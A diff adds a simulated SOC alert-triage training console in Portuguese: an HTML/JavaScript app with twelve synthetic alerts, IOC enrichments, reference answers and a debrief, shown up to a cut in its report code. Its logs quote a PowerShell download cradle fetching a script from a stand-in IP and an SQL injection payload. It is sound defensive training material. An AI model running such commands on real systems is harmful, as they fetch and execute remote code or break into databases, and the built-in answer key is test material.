@@ -1,0 +1,346 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; base-uri 'none'; form-action 'none'">
+<title>SOC Hands-on - Console de Triagem</title>
+<style>
+:root{--bg:#0d1117;--panel:#161b22;--panel2:#1c2330;--line:#2d3646;--tx:#e6edf3;--mut:#9aa7b8;--acc:#4da3ff;--ok:#3fb950;--warn:#d29922;--bad:#f85149;--crit:#ff6b9d}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--tx);font:14px/1.5 system-ui,Segoe UI,Roboto,sans-serif}
+header{display:flex;flex-wrap:wrap;gap:12px;align-items:center;padding:10px 16px;background:var(--panel);border-bottom:1px solid var(--line)}
+header h1{font-size:16px;margin:0;margin-right:auto}
+header h1 small{color:var(--mut);font-weight:400;margin-left:8px}
+.kpi{background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:4px 10px;text-align:center;min-width:92px}
+.kpi b{display:block;font-size:18px}.kpi span{color:var(--mut);font-size:11px}
+input[type=text],select,textarea{background:var(--bg);color:var(--tx);border:1px solid var(--line);border-radius:6px;padding:6px 8px;font:inherit;width:100%}
+header input{width:200px}
+button{background:var(--acc);color:#04111f;border:0;border-radius:6px;padding:7px 12px;font:inherit;font-weight:600;cursor:pointer}
+button.sec{background:var(--panel2);color:var(--tx);border:1px solid var(--line)}
+button:disabled{opacity:.45;cursor:not-allowed}
+button:focus-visible,input:focus-visible,select:focus-visible,textarea:focus-visible,.card:focus-visible{outline:2px solid var(--acc);outline-offset:2px}
+main{display:grid;grid-template-columns:340px 1fr;gap:12px;padding:12px;min-height:calc(100vh - 64px)}
+@media(max-width:860px){main{grid-template-columns:1fr}}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:12px}
+.filters{display:flex;gap:6px;margin-bottom:10px}
+.filters button{flex:1;padding:5px}
+.filters button.on{background:var(--acc);color:#04111f}
+.card{border:1px solid var(--line);border-left-width:4px;border-radius:8px;padding:8px 10px;margin-bottom:8px;cursor:pointer;background:var(--panel2)}
+.card:hover,.card.sel{border-color:var(--acc)}
+.card .t{font-weight:600;margin:2px 0}
+.card .m{color:var(--mut);font-size:12px;display:flex;gap:8px;flex-wrap:wrap}
+.card.done{opacity:.7}
+.s-Informativa{border-left-color:#6e7681}.s-Baixa{border-left-color:var(--ok)}.s-Média{border-left-color:var(--warn)}.s-Alta{border-left-color:var(--bad)}.s-Crítica{border-left-color:var(--crit)}
+.chip{display:inline-block;border-radius:10px;padding:0 8px;font-size:11px;border:1px solid var(--line);color:var(--mut)}
+.chip.ok{color:var(--ok);border-color:var(--ok)}
+h2{font-size:17px;margin:0 0 4px}h3{font-size:13px;text-transform:uppercase;letter-spacing:.05em;color:var(--mut);margin:16px 0 6px}
+pre{background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:10px;overflow:auto;white-space:pre-wrap;word-break:break-word;font:12.5px/1.5 Consolas,monospace;margin:0}
+table{width:100%;border-collapse:collapse}td,th{padding:6px;border-bottom:1px solid var(--line);text-align:left;vertical-align:top}
+th{color:var(--mut);font-weight:500;font-size:12px}
+code{font-family:Consolas,monospace;word-break:break-all}
+.enr{background:var(--panel2);border-left:3px solid var(--acc);padding:6px 10px;margin:4px 0 8px;font-size:13px}
+.enr small{color:var(--mut);display:block}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media(max-width:700px){.grid2{grid-template-columns:1fr}}
+fieldset{border:1px solid var(--line);border-radius:8px;margin:0 0 10px;padding:8px 10px}
+legend{color:var(--mut);font-size:12px;padding:0 4px}
+label.opt{display:block;padding:2px 0;cursor:pointer}
+.fb{border:1px solid var(--line);border-radius:8px;padding:10px;margin-top:12px;background:var(--panel2)}
+.fb .r{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:6px}
+.good{color:var(--ok)}.badc{color:var(--bad)}
+.err{color:var(--bad);margin:6px 0}
+.empty{color:var(--mut)}.empty li{margin:4px 0}
+dialog{background:var(--panel);color:var(--tx);border:1px solid var(--line);border-radius:12px;max-width:760px;width:92vw;max-height:88vh;overflow:auto}
+dialog::backdrop{background:#000a}
+.tl div{padding:3px 0;border-bottom:1px dashed var(--line)}
+.warn{background:#2a2410;border:1px solid var(--warn);border-radius:8px;padding:8px 10px;color:#f0d98a;font-size:13px}
+</style>
+</head>
+<body>
+<header>
+  <h1>OrbitaPay SOC<small>Console de Triagem (simulado) - 06/10/2026</small></h1>
+  <input type="text" id="analyst" placeholder="Seu nome / RM (opcional)" aria-label="Nome do analista" maxlength="60" autocomplete="off">
+  <div class="kpi"><b id="kTri">0/12</b><span>Triados</span></div>
+  <div class="kpi"><b id="kVer">0</b><span>Vereditos certos</span></div>
+  <div class="kpi"><b id="kEnr">0</b><span>Consultas feitas</span></div>
+  <button class="sec" id="bRep">Relatório</button>
+  <button id="bDeb">Debrief</button>
+  <button class="sec" id="bRst">Reiniciar</button>
+</header>
+<main>
+  <section class="panel" aria-label="Fila de alertas">
+    <div class="filters" role="group" aria-label="Filtro">
+      <button data-f="all" class="on">Todos</button><button data-f="new" class="sec">Pendentes</button><button data-f="done" class="sec">Triados</button>
+    </div>
+    <div id="list"></div>
+  </section>
+  <section class="panel" id="detail" aria-live="polite"></section>
+</main>
+<dialog id="dlg"></dialog>
+
+<script>
+"use strict";
+/* ===== Dados 100% sintéticos: IPs RFC 5737, domínios .example, hashes inventados ===== */
+const SEVS=['Informativa','Baixa','Média','Alta','Crítica'];
+const VERD={TP:'Verdadeiro positivo',FP:'Falso positivo',INC:'Inconclusivo (faltam evidências)'};
+const ACTIONS={
+  fp:'Fechar como falso positivo',
+  monitor:'Monitorar / abrir ticket de acompanhamento',
+  block:'Bloquear IOC (firewall / proxy / DNS)',
+  purge:'Remover e-mails das caixas (purge)',
+  reset:'Resetar credenciais e revogar sessões',
+  isolate:'Isolar host (EDR)',
+  remediate:'Corrigir configuração (reverter exposição)',
+  escalate:'Escalar para Resposta a Incidentes (IR)'
+};
+const TECHS=[
+  ['T1566.002','Phishing: Spearphishing Link'],
+  ['T1078','Valid Accounts'],
+  ['T1059.001','Command and Scripting: PowerShell'],
+  ['T1046','Network Service Discovery'],
+  ['T1110','Brute Force'],
+  ['T1003','OS Credential Dumping'],
+  ['T1569.002','System Services: Service Execution'],
+  ['T1568.002','Dynamic Resolution: DGA'],
+  ['T1567.002','Exfiltration to Cloud Storage'],
+  ['T1530','Data from Cloud Storage'],
+  ['T1190','Exploit Public-Facing Application'],
+  ['T1486','Data Encrypted for Impact'],
+  ['NA','N/A - atividade legítima']
+];
+const ALERTS=[
+{id:'A-001',time:'09:02',src:'E-mail Gateway',sev:'Média',title:'Possível phishing: "Fatura em atraso - ação imediata"',entity:'Destinatários: mferreira, rlima, tsouza',
+ summary:'Mensagem entregue a 3 usuários da área financeira. Regra heurística de phishing disparou.',
+ log:`From: financeiro@orbitapay-fatura[.]example  (SPF=fail DKIM=none DMARC=fail)
+Reply-To: suporte.fatura@mailbox-free[.]example
+Subject: Fatura em atraso - ação imediata
+Body URL: hxxps://orbitapay-fatura[.]example/login?id=8841
+Entregues: 3 | Anexos: 0`,
+ iocs:[
+  {t:'Domínio',v:'orbitapay-fatura[.]example',r:'Whois (simulado): registrado há 2 dias, registrar com privacy. Mesmo nameserver de 14 domínios sinalizados. Reputação: MALICIOSO (7/10 fontes).'},
+  {t:'URL',v:'hxxps://orbitapay-fatura[.]example/login?id=8841',r:'urlscan (simulado): página copia o logo e o layout do portal OrbitaPay. O formulário envia POST para outro domínio (cdn-assets-delivery[.]example). Certificado emitido há 2 dias.'},
+  {t:'Remetente',v:'financeiro@orbitapay-fatura[.]example',r:'O domínio oficial da empresa é orbitapay.example. SPF e DMARC falham: o remetente não é autorizado.'}],
+ ref:{verdict:'TP',sev:'Alta',tech:'T1566.002',inc:'A',must:['block','purge'],ok:['escalate','monitor'],
+  why:'Domínio recém-registrado imitando a marca, falha de SPF/DMARC e página de coleta de credenciais. Há 3 destinatários, então é preciso remover os e-mails antes que mais gente clique. Este alerta é o ponto de entrada do Incidente A.'}},
+{id:'A-002',time:'09:09',src:'Proxy / DNS',sev:'Baixa',title:'Acesso a domínio recém-registrado (NRD) por mferreira',entity:'mferreira @ WKS-FIN-07 (10.20.8.31)',
+ summary:'Categoria "Newly Registered Domain". Severidade inicial baixa pelo sistema.',
+ log:`09:08:41 mferreira WKS-FIN-07 GET  hxxps://orbitapay-fatura[.]example/login?id=8841   200
+09:09:02 mferreira WKS-FIN-07 POST hxxps://orbitapay-fatura[.]example/collect         302 -> cdn-assets-delivery[.]example
+09:09:30 mferreira WKS-FIN-07 GET  hxxps://orbitapay-fatura[.]example/dl/Fatura_8841.docm  200 (84 KB)`,
+ iocs:[
+  {t:'IP',v:'203.0.113.10',r:'Hospedagem do domínio de phishing. AbuseIPDB (simulado): 88% de confiança, 41 relatórios (phishing, malware hosting).'},
+  {t:'Domínio',v:'cdn-assets-delivery[.]example',r:'Destino do POST do formulário. Registrado há 2 dias. Reputação: MALICIOSO. Usado para coletar credenciais.'}],
+ ref:{verdict:'TP',sev:'Alta',tech:'T1566.002',inc:'A',must:['block','reset'],ok:['isolate','escalate'],
+  why:'O usuário abriu a página E enviou um POST (credenciais), depois baixou um .docm. O contexto sobe a severidade de Baixa para Alta. Lição: reavalie a severidade que o sistema atribuiu.'}},
+{id:'A-003',time:'09:31',src:'Identidade (IdP)',sev:'Média',title:'Login impossível: mferreira',entity:'mferreira',
+ summary:'Dois logins bem-sucedidos em locais distantes com 44 minutos de diferença.',
+ log:`08:47 LOGIN OK  mferreira  192.0.2.20    (escritório SP)   MFA=ok    UA=Chrome/129
+09:31 LOGIN OK  mferreira  203.0.113.45  (país distante)   MFA=n/a   UA=python-requests/2.31  protocolo=IMAP (legacy auth)`,
+ iocs:[
+  {t:'IP',v:'203.0.113.45',r:'AbuseIPDB (simulado): 92% de confiança, 118 relatórios (credential stuffing, uso de proxy/VPN comercial). ASN de hosting, não residencial.'},
+  {t:'User-Agent',v:'python-requests/2.31',r:'Cliente de script. Não é um cliente de e-mail normal. Legacy auth (IMAP) não exige MFA, e é por isso que o atacante usou esse protocolo.'}],
+ ref:{verdict:'TP',sev:'Alta',tech:'T1078',inc:'A',must:['reset'],ok:['block','escalate','monitor'],
+  why:'As credenciais coletadas em A-002 já estão sendo usadas, via legacy auth para fugir do MFA. Resetar a senha NÃO basta: revogue as sessões e desabilite a legacy auth (gap de controle a levar ao time de Identidade).'}},
+{id:'A-004',time:'09:44',src:'EDR',sev:'Alta',title:'PowerShell com comando codificado iniciado por WINWORD.EXE',entity:'mferreira @ WKS-FIN-07',
+ summary:'Cadeia de processos incomum: um editor de texto lançando o PowerShell.',
+ log:`09:44:10 WKS-FIN-07 process_create parent=WINWORD.EXE child=powershell.exe
+  cmdline: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...
+09:44:09 WKS-FIN-07 file_open   C:\\Users\\mferreira\\Downloads\\Fatura_8841.docm  (macro executada)`,
+ iocs:[
+  {t:'SHA-256',v:'9f2c4e7a1b8d3056c4a9e1f7d20b6385a3c7e91f4d8b2a60c5e3f7a19d4b8c02',r:'VirusTotal (simulado): 41/72 detecções, classificação Trojan.Downloader.Macro. Primeiro envio há 3 dias.'},
+  {t:'Comando decodificado',v:'(CyberChef simulado)',r:'IEX (New-Object Net.WebClient).DownloadString("hxxp://203.0.113.10/s.ps1"), um download cradle que baixa e executa um script do mesmo IP do phishing.'}],
+ ref:{verdict:'TP',sev:'Crítica',tech:'T1059.001',inc:'A',must:['isolate','escalate'],ok:['block'],
+  why:'Execução de código no endpoint: o phishing virou comprometimento de host. Aqui o isolamento do host precisa ser IMEDIATO. Cada minuto a mais é janela para movimentação lateral e exfiltração (veja A-012).'}},
+{id:'A-005',time:'09:50',src:'Firewall',sev:'Alta',title:'Port scan interno: 10.20.5.14 -> 10.20.0.0/24',entity:'10.20.5.14',
+ summary:'4.812 SYNs para 600 portas distintas em 5 minutos.',
+ log:`09:45-09:50 SRC=10.20.5.14 DST=10.20.0.0/24 SYN=4812 portas_distintas=600
+CMDB: 10.20.5.14 = SCAN-VULN-01 (scanner de vulnerabilidades corporativo, owner: SecOps)
+Calendário de mudanças: CHG-1042 "Varredura mensal de vulnerabilidades" Qua 09:45-11:00 (APROVADA)`,
+ iocs:[{t:'IP',v:'10.20.5.14',r:'CMDB: ativo SCAN-VULN-01, owner SecOps. Mudança CHG-1042 aprovada cobrindo exatamente este horário e este escopo.'}],
+ ref:{verdict:'FP',sev:'Informativa',tech:'NA',inc:'none',must:['fp'],ok:['monitor'],
+  why:'Atividade esperada e documentada (CMDB + mudança aprovada na janela). A técnica (T1046) seria real se o origem fosse desconhecido. Bom momento para sugerir a criação de uma exceção/tag para o scanner e reduzir ruído.'}},
+{id:'A-006',time:'10:02',src:'VPN / SIEM',sev:'Média',title:'Brute force: 47 falhas de login (admin) na VPN',entity:'198.51.100.77',
+ summary:'Várias contas tentadas a partir de um único IP externo.',
+ log:`09:55-10:01 47x LOGIN FAIL  src=198.51.100.77  users=admin,administrator,root,vpnuser
+Sucessos: 0 | MFA: obrigatório | Lockout: ativado após 5 tentativas`,
+ iocs:[{t:'IP',v:'198.51.100.77',r:'AbuseIPDB (simulado): 100% de confiança, ASN de hosting. Varredura/brute force constante em feeds.'}],
+ ref:{verdict:'TP',sev:'Baixa',tech:'T1110',inc:'none',must:['block'],ok:['monitor'],
+  why:'O ataque é real, mas falhou: 0 sucessos, MFA e lockout funcionaram (reconheça o controle que deu certo). Severidade Baixa; bloqueie o IP e siga. Não tem relação com o Incidente A.'}},
+{id:'A-007',time:'10:08',src:'EDR',sev:'Alta',title:'Ferramenta de administração remota: PsExec em SRV-FILE-02',entity:'adm.silva @ JUMP-IT-01 -> SRV-FILE-02',
+ summary:'Uso de PsExec, frequentemente abusado para movimentação lateral.',
+ log:`10:08:12 SRV-FILE-02 service_install name=PSEXESVC  origem=JUMP-IT-01 (jump host de TI)
+usuário: adm.silva (grupo Server-Admins) | binário assinado: Microsoft Corporation (válida)
+Ticket: CHG-1047 "Patch mensal servidor de arquivos" Qua 10:00-12:00 (APROVADA)`,
+ iocs:[
+  {t:'Host origem',v:'JUMP-IT-01',r:'CMDB: jump host oficial da TI, único ponto de administração remota autorizado.'},
+  {t:'Binário',v:'PsExec.exe (assinatura válida)',r:'Ferramenta legítima Sysinternals. Reputação limpa, mas é abusada por atacantes: o contexto é o que decide.'}],
+ ref:{verdict:'FP',sev:'Informativa',tech:'NA',inc:'none',must:['fp'],ok:['monitor'],
+  why:'Admin legítimo, jump host oficial, binário assinado e mudança aprovada na janela. Contraste com A-004: aqui o CONTEXTO justifica; o nome da ferramenta, sozinho, não prova nada (e vice-versa).'}},
+{id:'A-008',time:'10:15',src:'DNS',sev:'Média',title:'Consultas DNS de alta entropia (possível DGA / C2) de WKS-FIN-07',entity:'WKS-FIN-07 (10.20.8.31)',
+ summary:'Padrão periódico de consultas a domínios com nomes aleatórios.',
+ log:`10:11:04 WKS-FIN-07 A? p0lm2nb8ty[.]example  NXDOMAIN
+10:12:03 WKS-FIN-07 A? q7wz1xk4mc[.]example  NXDOMAIN
+10:13:05 WKS-FIN-07 A? xk3j9qz7vw[.]example  NOERROR -> 203.0.113.88
+10:14:04 WKS-FIN-07 A? xk3j9qz7vw[.]example  NOERROR -> 203.0.113.88
+(intervalo médio: 60s ±5s)`,
+ iocs:[
+  {t:'Domínio',v:'xk3j9qz7vw[.]example',r:'Registrado há 1 dia. Sem conteúdo web legítimo. Padrão de nome compatível com DGA.'},
+  {t:'IP',v:'203.0.113.88',r:'Threat feed (simulado): reportado como C2 em 3 fontes, confiança 90%. Comunicações periódicas (beacon).'}],
+ ref:{verdict:'TP',sev:'Crítica',tech:'T1568.002',inc:'A',must:['isolate','block'],ok:['escalate'],
+  why:'Beacon a cada ~60s a partir do MESMO host do A-004: o C2 está ativo. Correlacionar host + horário liga os alertas; isoladamente o DNS pareceria só ruído.'}},
+{id:'A-009',time:'10:26',src:'Cloud (CSPM)',sev:'Alta',title:'Bucket de armazenamento tornou-se público: orbita-dev-backups',entity:'dev.rcosta (console)',
+ summary:'ACL alterada para leitura pública às 10:21.',
+ log:`10:21 PutBucketAcl bucket=orbita-dev-backups  ACL=public-read  actor=dev.rcosta
+Conteúdo: clientes_2025.sql (2,3 GB), dumps de homologação
+10:22-10:26 7 acessos externos de IPs distintos  UA=curl/8.4  (GET de objetos)`,
+ iocs:[{t:'Bucket',v:'orbita-dev-backups',r:'Contém dump com dados de clientes (PII). Já há leitura por IPs externos, portanto exposição REAL, não apenas risco teórico.'}],
+ ref:{verdict:'TP',sev:'Crítica',tech:'T1530',inc:'none',must:['remediate','escalate'],ok:['block','monitor'],
+  why:'Dados pessoais acessíveis a qualquer um e já acessados. Reverta a ACL primeiro, depois escale: pode haver obrigação de comunicar o incidente (LGPD). Problema INDEPENDENTE do Incidente A.'}},
+{id:'A-010',time:'10:40',src:'WAF',sev:'Alta',title:'SQL Injection detectada em /api/clientes?id=',entity:'192.0.2.99',
+ summary:'Payloads clássicos de SQLi contra a API pública.',
+ log:`10:36-10:40 12x GET /api/clientes?id=1' OR '1'='1' --   src=192.0.2.99   UA=sqlmap/1.7
+Resposta: 403 (regra 942100) em 12/12 requisições | Nenhuma resposta 200`,
+ iocs:[
+  {t:'IP',v:'192.0.2.99',r:'AbuseIPDB (simulado): 76% de confiança, associado a scanners automatizados.'},
+  {t:'User-Agent',v:'sqlmap/1.7',r:'Ferramenta automatizada de exploração de SQLi, que identifica atividade de scanner e não de atacante direcionado.'}],
+ ref:{verdict:'TP',sev:'Baixa',tech:'T1190',inc:'none',must:['block'],ok:['monitor'],
+  why:'Tentativa real, mas 12/12 bloqueadas pelo WAF. Severidade Baixa. Vale monitorar se o IP muda de técnica e confirmar que a API usa queries parametrizadas (defense in depth, não confie só no WAF).'}},
+{id:'A-011',time:'10:52',src:'E-mail Gateway',sev:'Média',title:'Phishing heurístico: newsletter "Promoções de Outubro"',entity:'1.200 destinatários',
+ summary:'Regra de reputação disparou por volume e links de rastreio.',
+ log:`From: news@parceiro-varejo[.]example  (SPF=pass DKIM=pass DMARC=pass)
+List-Unsubscribe: presente | Links: click.parceiro-varejo[.]example (tracking)
+CRM: parceiro-varejo[.]example é parceiro cadastrado desde 2023`,
+ iocs:[{t:'Domínio',v:'parceiro-varejo[.]example',r:'Registrado há 6 anos, 0/70 detecções, SPF/DKIM/DMARC alinhados. Parceiro comercial conhecido.'}],
+ ref:{verdict:'FP',sev:'Informativa',tech:'NA',inc:'none',must:['fp'],ok:['monitor'],
+  why:'Autenticação alinhada, domínio antigo, parceiro no CRM. A regra é grosseira (volume + tracking). Boa ação extra: ajustar a regra para reduzir falsos positivos.'}},
+{id:'A-012',time:'11:02',src:'DLP',sev:'Alta',title:'Upload volumoso para nuvem pessoal a partir de WKS-FIN-07',entity:'mferreira @ WKS-FIN-07',
+ summary:'2,1 GB enviados em 3 minutos por processo que não é navegador.',
+ log:`11:02-11:05 WKS-FIN-07 process=powershell.exe  dest=files-share-free[.]example  upload=2,1 GB
+Arquivos: Planilhas_Folha_2026.zip (2,1 GB)
+Classificação DLP: Confidencial - Financeiro`,
+ iocs:[{t:'Domínio',v:'files-share-free[.]example',r:'Serviço anônimo de compartilhamento de arquivos, sem cadastro. Usado com frequência para exfiltração.'}],
+ ref:{verdict:'TP',sev:'Crítica',tech:'T1567.002',inc:'A',must:['isolate','escalate'],ok:['block'],
+  why:'Exfiltração de dados confidenciais pelo host já comprometido (A-004/A-008). Se o WKS-FIN-07 tivesse sido isolado às 09:44, esses 2,1 GB não teriam saído: é o custo de uma triagem lenta.'}}
+];
+
+/* ===== Estado e helpers ===== */
+const S={sel:null,filter:'all',st:{},enr:new Set()}; // st[id]={ans,g}
+const $=s=>document.querySelector(s);
+function h(tag,props,...kids){const e=document.createElement(tag);for(const[k,v]of Object.entries(props||{})){if(k==='class')e.className=v;else if(k.startsWith('on'))e.addEventListener(k.slice(2),v);else if(v!==false&&v!=null)e.setAttribute(k,v);}for(const k of kids.flat()){if(k!=null)e.append(k);}return e;}
+function grade(a,ans){const r=a.ref;const v=ans.verdict===r.verdict,s=ans.sev===r.sev,t=ans.tech===r.tech,i=ans.inc===r.inc;
+  const miss=r.must.filter(x=>!ans.actions.includes(x));const extra=ans.actions.filter(x=>!r.must.includes(x)&&!r.ok.includes(x));
+  const ac=!miss.length&&!extra.length;return{v,s,t,i,ac,miss,extra,pts:[v,s,t,i,ac].filter(Boolean).length};}
+
+/* ===== Lista ===== */
+function renderList(){
+  const box=$('#list');box.replaceChildren();
+  for(const a of ALERTS){const d=!!S.st[a.id];
+    if(S.filter==='new'&&d)continue;if(S.filter==='done'&&!d)continue;
+    const c=h('div',{class:`card s-${a.sev}${d?' done':''}${S.sel===a.id?' sel':''}`,tabindex:'0',role:'button','aria-label':`${a.id} ${a.title}`,
+      onclick:()=>select(a.id),onkeydown:e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();select(a.id);}}},
+      h('div',{class:'m'},h('b',null,a.id),a.time,a.src,h('span',{class:'chip'},a.sev),d?h('span',{class:'chip ok'},'triado'):null),
+      h('div',{class:'t'},a.title));
+    box.append(c);}
+  const n=Object.keys(S.st).length;$('#kTri').textContent=`${n}/${ALERTS.length}`;
+  $('#kVer').textContent=Object.values(S.st).filter(x=>x.g.v).length;$('#kEnr').textContent=S.enr.size;
+}
+function select(id){S.sel=id;renderList();renderDetail();}
+
+/* ===== Detalhe ===== */
+function renderDetail(){
+  const box=$('#detail');box.replaceChildren();
+  if(!S.sel){box.append(h('h2',null,'Bem-vindo ao turno'),
+    h('p',{class:'empty'},'Você é o analista N1 de plantão da OrbitaPay (fintech fictícia). A fila tem 12 alertas. Para cada um:'),
+    h('ol',{class:'empty'},h('li',null,'Leia a evidência e CONSULTE os IOCs (reputação simulada).'),h('li',null,'Decida: verdadeiro positivo, falso positivo ou inconclusivo.'),
+      h('li',null,'Defina a severidade REAL (pode diferir da do sistema), a técnica ATT&CK, as ações e se o alerta faz parte de um incidente maior.'),h('li',null,'Registre a triagem para ver a análise de referência.')),
+    h('p',{class:'empty'},'Dica: alguns alertas se conectam. Procure hosts, usuários, IPs e horários em comum. Todos os dados são fictícios.'));return;}
+  const a=ALERTS.find(x=>x.id===S.sel);const done=S.st[a.id];
+  box.append(h('h2',null,`${a.id} - ${a.title}`),
+    h('div',{class:'m',style:'color:var(--mut)'},`${a.time} | ${a.src} | severidade do sistema: ${a.sev} | ${a.entity}`),
+    h('p',null,a.summary),h('h3',null,'Evidência'),h('pre',null,a.log),h('h3',null,'IOCs (clique em Consultar)'));
+  const tb=h('table',null,h('tr',null,h('th',null,'Tipo'),h('th',null,'Valor'),h('th',null,'')));
+  a.iocs.forEach((o,i)=>{const key=`${a.id}:${i}`;const slot=h('div');
+    const btn=h('button',{class:'sec',onclick:()=>{S.enr.add(key);slot.replaceChildren(h('div',{class:'enr'},o.r,h('small',null,'Fonte simulada para fins didáticos')));btn.disabled=true;$('#kEnr').textContent=S.enr.size;}},'Consultar');
+    if(S.enr.has(key)){slot.append(h('div',{class:'enr'},o.r,h('small',null,'Fonte simulada para fins didáticos')));btn.disabled=true;}
+    tb.append(h('tr',null,h('td',null,o.t),h('td',null,h('code',null,o.v),slot),h('td',null,btn)));});
+  box.append(tb,h('h3',null,'Sua triagem'));
+  box.append(buildForm(a,done));
+  if(done)box.append(buildFeedback(a,done));
+}
+function buildForm(a,done){
+  const A=done?done.ans:{};const dis=!!done;
+  const f=h('form',{onsubmit:e=>e.preventDefault()});
+  const radio=(name,val,txt,chk)=>h('label',{class:'opt'},h('input',{type:'radio',name,value:val,checked:chk?'':false,disabled:dis?'':false}),' '+txt);
+  f.append(h('div',{class:'grid2'},
+    h('fieldset',null,h('legend',null,'Veredito'),...Object.entries(VERD).map(([k,v])=>radio('verdict',k,v,A.verdict===k))),
+    h('fieldset',null,h('legend',null,'Severidade real'),...SEVS.map(s=>radio('sev',s,s,A.sev===s)))));
+  const sel=(id,opts,val)=>{const s=h('select',{id,disabled:dis?'':false},h('option',{value:''},'- selecione -'),...opts.map(([v,t])=>h('option',{value:v,selected:val===v?'':false},v==='NA'||v==='none'?t:(id==='tech'?`${v} - ${t}`:t))));return s;};
+  f.append(h('div',{class:'grid2'},
+    h('div',null,h('label',{for:'tech'},'Técnica MITRE ATT&CK'),sel('tech',TECHS,A.tech)),
+    h('div',null,h('label',{for:'inc'},'Relação com outros alertas'),sel('inc',[['A','Faz parte de uma cadeia de ataque (Incidente A)'],['none','Evento isolado / sem relação']],A.inc))));
+  f.append(h('fieldset',{style:'margin-top:10px'},h('legend',null,'Ações recomendadas'),...Object.entries(ACTIONS).map(([k,v])=>
+    h('label',{class:'opt'},h('input',{type:'checkbox',name:'act',value:k,checked:A.actions&&A.actions.includes(k)?'':false,disabled:dis?'':false}),' '+v))));
+  f.append(h('label',{for:'note'},'Justificativa (1-2 linhas)'),h('textarea',{id:'note',rows:'2',maxlength:'400',disabled:dis?'':false},A.note||''));
+  const err=h('div',{class:'err',role:'alert'});
+  f.append(err,h('button',{type:'button',disabled:dis?'':false,onclick:()=>{
+    const ans={verdict:(f.querySelector('[name=verdict]:checked')||{}).value,sev:(f.querySelector('[name=sev]:checked')||{}).value,
+      tech:f.querySelector('#tech').value,inc:f.querySelector('#inc').value,actions:[...f.querySelectorAll('[name=act]:checked')].map(x=>x.value),note:f.querySelector('#note').value.trim()};
+    if(!ans.verdict||!ans.sev||!ans.tech||!ans.inc||!ans.actions.length){err.textContent='Preencha veredito, severidade, técnica, relação e ao menos uma ação.';return;}
+    S.st[a.id]={ans,g:grade(a,ans)};renderList();renderDetail();}},'Registrar triagem'));
+  return f;
+}
+function buildFeedback(a,d){
+  const g=d.g,r=a.ref;const mk=(ok,t)=>h('span',{class:'chip '+(ok?'ok':''),style:ok?'':'color:var(--bad);border-color:var(--bad)'},(ok?'✔ ':'✘ ')+t);
+  const fb=h('div',{class:'fb'},h('b',null,`Análise de referência (${g.pts}/5 pontos de aderência)`),
+    h('div',{class:'r',style:'margin-top:6px'},mk(g.v,'Veredito'),mk(g.s,'Severidade'),mk(g.t,'Técnica'),mk(g.i,'Correlação'),mk(g.ac,'Ações')),
+    h('p',null,h('b',null,'Esperado: '),`${VERD[r.verdict]} | ${r.sev} | ${r.tech==='NA'?'N/A':r.tech} | ${r.inc==='A'?'Incidente A':'isolado'}`),
+    h('p',null,h('b',null,'Ações essenciais: '),r.must.map(x=>ACTIONS[x]).join('; ')+'.'),
+    g.miss.length?h('p',{class:'badc'},'Faltou: '+g.miss.map(x=>ACTIONS[x]).join('; ')):null,
+    g.extra.length?h('p',{class:'badc'},'Desnecessário/arriscado aqui: '+g.extra.map(x=>ACTIONS[x]).join('; ')):null,
+    h('p',null,r.why));
+  return fb;
+}
+
+/* ===== Debrief e relatório ===== */
+function openDebrief(){
+  const dlg=$('#dlg');dlg.replaceChildren();const done=Object.entries(S.st);
+  const tot=done.reduce((s,[,x])=>s+x.g.pts,0);
+  dlg.append(h('h2',null,'Debrief do turno'),h('p',null,`Triados: ${done.length}/${ALERTS.length} | Aderência: ${tot}/${done.length*5||0} pontos | Consultas a IOCs: ${S.enr.size}`));
+  if(done.length<ALERTS.length)dlg.append(h('div',{class:'warn'},'Ainda há alertas pendentes. O debrief completo fica melhor depois de triar todos.'));
+  const inc=ALERTS.filter(a=>a.ref.inc==='A');
+  dlg.append(h('h3',null,'Incidente A - linha do tempo da cadeia de ataque'),
+    h('div',{class:'tl'},...inc.map(a=>h('div',null,h('b',null,a.time+' '),`${a.id} - ${a.title}`))));
+  dlg.append(h('h3',null,'Perguntas para discussão'),
+    h('ol',null,h('li',null,'Em que alerta o incidente deveria ter sido contido? Quanto tempo entre o phishing (09:02) e a exfiltração (11:02)?'),
+      h('li',null,'Se o WKS-FIN-07 fosse isolado às 09:44, o que teria sido evitado? (Janela: 78 min.)'),
+      h('li',null,'Por que A-005, A-007 e A-011 são falsos positivos, e o que os distingue de A-004 (mesma "ferramenta suspeita", contexto diferente)?'),
+      h('li',null,'A-009 não tem relação com o Incidente A. Como priorizar dois incidentes críticos ao mesmo tempo?'),
+      h('li',null,'Quais controles preventivos teriam impedido a cadeia? (DMARC estrito, bloquear macros, desabilitar legacy auth, MFA resistente a phishing, DLP com bloqueio.)'),
+      h('li',null,'Qual IOC é mais fácil para o atacante trocar (hash, IP, domínio) e qual é mais caro (TTP)?')));
+  dlg.append(h('div',{style:'margin-top:14px;display:flex;gap:8px'},h('button',{class:'sec',onclick:()=>dlg.close()},'Fechar')));
+  dlg.showModal();
+}
+function buildReport(){
+  const who=$('#analyst').value.trim()||'(não informado)';
+  let m=`# Relatório de triagem - SOC Hands-on\n\nAnalista: ${who}\nData: 06/10/2026\n\n`;
+  for(const a of ALERTS){const d=S.st[a.id];m+=`## ${a.id} - ${a.title}\n`;
+    if(!d){m+='- Não triado\n\n';continue;}
+    const x=d.ans;m+=`- Veredito: ${VERD[x.verdict]}\n- Severidade: ${x.sev} (sistema: ${a.sev})\n- Técnica: ${x.tech}\n- Incidente: ${x.inc==='A'?'A':'isolado'}\n- Ações: ${x.actions.map(k=>ACTIONS[k]).join('; ')}\n- Justificativa: ${x.note||'-'}\n\n`;}
+  return m;
+}
+function downloadReport(){
